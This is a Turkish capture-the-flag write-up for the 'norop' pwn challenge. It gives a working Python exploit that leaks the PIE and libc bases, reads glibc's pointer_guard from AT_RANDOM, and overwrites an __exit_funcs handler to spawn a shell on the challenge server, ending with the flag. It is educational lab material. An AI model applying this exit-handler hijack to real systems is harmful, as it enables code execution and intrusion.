# 🎯 norop - Pwn Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Pwn-Challenge-darkblue?style=for-the-badge" alt="Pwn">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Binary%20Exploitation-purple?style=for-the-badge" alt="Binary Exploitation">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Pwn  
**Seviye:** Orta  
**Puan:** 300

**Challenge Açıklaması:** Sistem güvenli, ret overwrite yok, ROP yok. Geri kalan sende...

**Challenge Dosyası** [📥 Google Drive - pwnnorop.zip](https://drive.google.com/file/d/1uiiQrv84hwTxFxJFl-S-dE24u-e1uUx2/view?usp=sharing)

**Challenge URL** `nc 46.101.237.185 7001`

---

## 🔍 Analiz

**Hedef:** Binary içindeki arbitrary read/write yetkisini kullanarak shell alıp flag'i okumak.

**Strateji:** PIE leak → libc leak → `__exit_funcs` yapısını bul → `AT_RANDOM` üzerinden `pointer_guard` leak et → exit handler'ı `system("/bin/sh")` olacak şekilde ez → Flag

**İpuçları:**
- 🎯 Program başlangıçta `main` adresini leak ediyor, bu da PIE base hesaplamayı sağlıyor.
- 🔍 Menüdeki read/write seçenekleri doğrudan arbitrary read ve arbitrary write veriyor.
- 💡 Full RELRO, Canary, NX, PIE, SHSTK ve IBT yüzünden klasik GOT overwrite / ROP yolu kapalı.
- 🔑 Çözümü açan kilit nokta, glibc içindeki `__exit_funcs` yapısını ve pointer mangling mekanizmasını hedef almak oldu.

---

## ✅ Çözüm Adımları

### 🔎 **Adım 1: Binary Koruma Mekanizmalarını Kontrol Et**

İlk olarak binary'nin hangi savunmaları kullandığını kontrol ettik.

```bash
checksec --file=vuln
```

**Çıktı:**
```text
[*] '/home/kali/Desktop/soru/pwnnorop/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'/challenge'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**Analiz:**
- ✅ Full RELRO yüzünden GOT overwrite yapılamıyor.
- 💡 SHSTK + IBT yüzünden klasik ROP zinciri kurmak mantıklı değil.
- 🎯 Demek ki binary'nin kendi verdiği read/write primitive'lerine odaklanmak gerekiyor.

---

### 🔬 **Adım 2: Programın Verdiği Primitive'leri Anlamak**

`strings` ve disassembly ile menü seçeneklerinin ne yaptığını inceledik.

```bash
strings vuln | grep -E "format|%|printf|scanf|gets|read|input"
objdump -d vuln | grep -A 80 "1301"
objdump -d vuln | grep -A 50 "13bd"
```

**Çıktı:**
```text
Format: <addr:%p> <size:decimal>
%p %zu
Input %zu bytes:
main burada, gerisi sende: %p
printf@GLIBC_2.2.5
read@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__isoc99_sscanf@GLIBC_2.7
```

**Analiz:**
- ✅ `read_mem` seçeneği istenilen adresteki belleği okuyup stdout'a basıyor.
- ✅ `write_mem` seçeneği istenilen adrese veri yazıyor.
- 💡 Yani elimizde doğrudan arbitrary read + arbitrary write var.
- 🎯 Bu primitive'ler exploitin tamamını kurmaya yetiyor.

---

### 🧠 **Adım 3: PIE ve libc Leak Almak**

Program daha başta `main` adresini verdiği için PIE base hesaplandı. Ardından `printf@GOT` okunarak libc base bulundu.

```python
import socket, struct, time

HOST='46.101.237.185'
PORT=7001
PRINTF_GOT_OFF = 0x3fa0

def recv_some(s, t=0.12):
    time.sleep(t)
    data = b''
    s.settimeout(0.05)
    try:
        while True:
            part = s.recv(4096)
            if not part:
                break
            data += part
    except:
        pass
    s.settimeout(None)
    return data

def read_mem(s, addr, size):
    recv_some(s)
    s.send(b'1\n')
    recv_some(s)
    s.send(f'{hex(addr)} {size}\n'.encode())
    time.sleep(0.18)
    return recv_some(s)[:size]

s = socket.socket()
s.connect((HOST, PORT))

banner = recv_some(s, 0.2)
pie_leak = int(banner.split(b'0x')[1].split(b'\n')[0], 16)
pie_base = pie_leak - 0x14f6

printf_addr = struct.unpack('<Q', read_mem(s, pie_base + PRINTF_GOT_OFF, 8))[0]
libc_base = printf_addr - 0x60100

print(hex(pie_base))
print(hex(libc_base))
```

**Çıktı:**
```text
main burada, gerisi sende: 0x60f183b014f6
libc_base   : 0x70be030eb000
```

**Analiz:**
- ✅ PIE base başarıyla bulundu.
- ✅ `printf@libc` leak edilerek libc base hesaplandı.
- 🎯 Artık libc içindeki hedef yapıları adresleyebiliriz.

---

### 🧠 **Adım 4: `__exit_funcs` Yapısını Hedef Seçmek**

Klasik yollar kapalı olduğu için `exit()` sırasında çağrılan glibc exit handler'larını hedef aldık.

```python
INITIAL_PTR_OFF = 0x203680

initial_ptr = libc_base + INITIAL_PTR_OFF
lst   = struct.unpack('<Q', read_mem(s, initial_ptr, 8))[0]
idx   = struct.unpack('<Q', read_mem(s, lst + 0x8, 8))[0]
entry = lst + 0x10
flavor= struct.unpack('<Q', read_mem(s, entry + 0x0, 8))[0]
fn_m  = struct.unpack('<Q', read_mem(s, entry + 0x8, 8))[0]
arg   = struct.unpack('<Q', read_mem(s, entry + 0x10, 8))[0]

print(hex(initial_ptr))
print(hex(lst))
print(idx)
print(hex(entry))
print(hex(fn_m))
```

**Çıktı:**
```text
initial_ptr : 0x70be032ee680
lst         : 0x70be032effc0
idx         : 1
entry       : 0x70be032effd0
fn_m        : 0xb7124b80bbd23df
```

**Analiz:**
- ✅ `__exit_funcs` zinciri bulundu.
- 💡 Buradaki function pointer düz tutulmuyor, glibc tarafından mangled halde saklanıyor.
- 🎯 Bir sonraki adım pointer mangling için gereken guard değerini leak etmek.

---

### 🧠 **Adım 5: `AT_RANDOM` ile `pointer_guard` Leak Etmek**

glibc pointer mangling çözmek için `pointer_guard` gerekiyor. Bu değer auxv içindeki `AT_RANDOM` alanından elde edildi.

```python
ENVIRON_OFF = 0x20ad58
AT_RANDOM = 25

envp = struct.unpack('<Q', read_mem(s, libc_base + ENVIRON_OFF, 8))[0]
blob = read_mem(s, envp, 0x1000)

off = 0
while off + 8 <= len(blob):
    v = struct.unpack('<Q', blob[off:off+8])[0]
    off += 8
    if v == 0:
        break

at_random = None
while off + 16 <= len(blob):
    a_type = struct.unpack('<Q', blob[off:off+8])[0]
    a_val  = struct.unpack('<Q', blob[off+8:off+16])[0]
    off += 16
    if a_type == 0:
        break
    if a_type == AT_RANDOM:
        at_random = a_val

rnd = read_mem(s, at_random, 16)
stack_guard   = struct.unpack('<Q', rnd[:8])[0]
pointer_guard = struct.unpack('<Q', rnd[8:16])[0]

print(hex(at_random))
print(hex(stack_guard))
print(hex(pointer_guard))
```

**Çıktı:**
```text
AT_RANDOM   : 0x7ffea9fedf89
stack_guard : 0xe68c635f67c9286e
ptr_guard   : 0x91eff506916c465e
```

**Analiz:**
- ✅ `AT_RANDOM` başarıyla bulundu.
- ✅ İlk 8 byte stack canary, ikinci 8 byte `pointer_guard` çıktı.
- 🎯 Artık istediğimiz fonksiyon pointer'ını glibc formatında yeniden mangleyebiliriz.

---

### 🚩 **Adım 6: Exit Handler'ı `system("/bin/sh")` Yapmak**

Artık `system` adresini glibc'nin kullandığı biçimde mangleyip mevcut exit entry üzerine yazıyoruz.

```python
SYSTEM_OFF = 0x58750
BINSH_OFF  = 0x1cb42f

def rol64(x, r):
    return ((x << r) | (x >> (64-r))) & 0xffffffffffffffff

def p64(x):
    return struct.pack('<Q', x)

def write_mem(s, addr, data):
    recv_some(s)
    s.send(b'2\n')
    recv_some(s)
    s.send(f'{hex(addr)} {len(data)}\n'.encode())
    recv_some(s)
    s.send(data)
    recv_some(s)

system = libc_base + SYSTEM_OFF
binsh  = libc_base + BINSH_OFF
mangled_system = rol64(system ^ pointer_guard, 0x11)

write_mem(s, entry + 0x0, p64(4))
write_mem(s, entry + 0x8, p64(mangled_system))
write_mem(s, entry + 0x10, p64(binsh))

s.send(b'3\n')
```

**Çıktı:**
```text
yazildi, exit...
OUT: b'Bye\nuid=1001(ctf) gid=1001(ctf) groups=1001(ctf)\n'
```

**Analiz:**
- ✅ `exit()` çağrısı sırasında artık glibc bizim yazdığımız handler'ı çalıştırıyor.
- ✅ Bu da doğrudan `system("/bin/sh")` çağrısına dönüşüyor.
- 🎯 Shell alındıktan sonra flag okunabilir hale geliyor.

---

### 🚩 **Adım 7: Flag'i Elde Et**

Shell geldikten sonra doğrudan `/flag.txt` dosyası okunur.

```bash
cat /flag.txt
```

**Çıktı:**
```text
Flag{KaynakkodlariSkyDaystencaldigimdogrudur}
```

---

## 🚩 **FLAG**
```text
Flag{KaynakkodlariSkyDaystencaldigimdogrudur}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🔧<br><b>checksec</b><br><sub>Binary korumalarını görmek için</sub></td>
<td align="center">🐍<br><b>Python</b><br><sub>Exploit scriptini yazmak için</sub></td>
<td align="center">🧪<br><b>objdump / strings</b><br><sub>Fonksiyonları ve sabitleri incelemek için</sub></td>
</tr>
</table>

---

## 💭 **Çözüm Akış Şeması**

```text
🎯 pwnnorop
       ↓
🔎 checksec ile korumaları analiz et
   → Full RELRO
   → SHSTK / IBT
       ↓
🔬 Arbitrary read / write primitive'lerini doğrula
   → read_mem
   → write_mem
       ↓
🧠 PIE ve libc leak al
   → main leak
   → printf@GOT leak
       ↓
🧠 __exit_funcs yapısını bul
   → exit entry adresini hesapla
       ↓
🧠 AT_RANDOM içinden pointer_guard leak et
   → auxv parse
   → pointer mangling çöz
       ↓
💥 exit handler'ı system("/bin/sh") ile değiştir
       ↓
🚩 FLAG: Flag{KaynakkodlariSkyDaystencaldigimdogrudur}
```
